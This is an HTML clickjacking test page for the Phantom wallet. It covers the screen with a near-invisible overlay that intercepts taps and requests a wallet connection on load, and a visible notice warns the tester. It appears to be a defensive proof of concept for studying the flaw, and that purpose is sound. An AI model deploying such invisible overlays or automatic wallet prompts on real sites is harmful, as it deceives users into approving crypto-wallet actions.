<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Phantom Mobile Clickjack Test</title>
  <style>
    body {
      font-family: sans-serif;
      background: #f0f0f0;
      margin: 0;
      padding: 2rem;
      text-align: center;
    }
    #status {
      margin: 2rem 0;
      font-weight: bold;
      color: #333;
    }
    #overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(255, 255, 255, 0.01); /* Nearly invisible */
      z-index: 9999;
      pointer-events: auto;
    }
    #notice {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: #ffc107;
      padding: 10px 20px;
      border-radius: 8px;
      z-index: 10000;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <h1>üß™ Phantom Clickjack Test</h1>
  <p id="status">Waiting for Phantom connection...</p>

  <div id="notice">Try clicking around ‚Äì this overlay may be stealing your taps.</div>

  <div id="overlay"></div>

  <script>
    const status = document.getElementById('status');
    const overlay = document.getElementById('overlay');

    // Overlay tap logger
    overlay.addEventListener('click', () => {
      alert('‚ö†Ô∏è Overlay captured the tap!');
      console.log('Overlay intercepted tap');
    });

    // Try to connect in element mode
    async function connectToPhantom() {
      if (window.solana?.isPhantom) {
        try {
          const res = await window.solana.connect({
            onlyIfTrusted: false,
            app: "iframe"
          });
          status.innerText = "‚úÖ Connected: " + res.publicKey.toString();
        } catch (e) {
          status.innerText = "‚ùå Connection failed: " + e.message;
        }
      } else {
        status.innerText = "üö´ Phantom wallet not found";
      }
    }

    window.onload = connectToPhantom;
  </script>
</body>
</html>
